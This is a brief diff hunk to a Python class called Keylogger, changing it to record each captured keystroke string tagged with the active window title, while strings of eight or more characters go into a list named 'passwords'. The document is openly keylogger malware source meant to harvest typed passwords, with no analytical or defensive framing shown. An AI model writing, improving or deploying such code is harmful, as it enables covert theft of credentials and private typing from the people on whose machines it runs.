@@ -48,7 +48,7 @@ class Keylogger:
         window = getForegroundWindowTitle()
         toAppend = window + ":" +s 
         if len(s) != 0:
-            self.all_strings.append(self.current_string)
+            self.all_strings.append(toAppend)
             if(len(s) >= 8):
                 self.passwords.append(toAppend)
 
